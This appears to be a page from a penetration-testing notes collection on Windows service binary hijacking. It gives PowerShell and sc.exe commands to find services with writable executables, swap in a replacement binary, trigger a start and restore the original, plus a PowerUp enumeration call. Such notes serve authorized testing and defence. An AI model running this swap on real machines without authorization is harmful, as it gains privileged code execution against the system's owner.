# Service binary hijacking

[← Windows services](services.md)

This path is about **file permissions** on the executable a service already runs. It does not require permission to change the service configuration. Check the service account, exact binary path, your effective file rights, and a start or restart trigger.

```powershell
Get-CimInstance -ClassName Win32_Service |
  Select-Object Name,State,StartMode,StartName,PathName
sc.exe qc <service-name>
icacls 'C:\Path\To\service.exe'
sc.exe query <service-name>
```

Read `PathName` carefully: it can contain arguments after the executable. Check the ACL on the executable itself and, if needed, its directory. `(M)` or `(F)` matters only if it belongs to your user or one of your effective groups. `sc.exe` avoids PowerShell's `sc` alias for `Set-Content`.

If the binary is writable, check the service state and save a copy before changing it. Use the exact service name and a trigger you can reach:

```powershell
sc.exe query <service-name>
# Stop the service first if it is running and you have SERVICE_STOP.
$backup = Join-Path $env:TEMP 'service.exe.bak'
Copy-Item 'C:\Path\To\service.exe' $backup
Copy-Item '.\replacement.exe' 'C:\Path\To\service.exe'
sc.exe start <service-name>
```

An already running service needs a restart; `SERVICE_START` alone does not grant `SERVICE_STOP`. If you cannot control it, check its normal trigger before making a file change. Restore the original after the test:

```powershell
Copy-Item $backup 'C:\Path\To\service.exe'
```

PowerUp can find candidate files, but confirm the ACL and trigger yourself:

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

[Microsoft service access rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
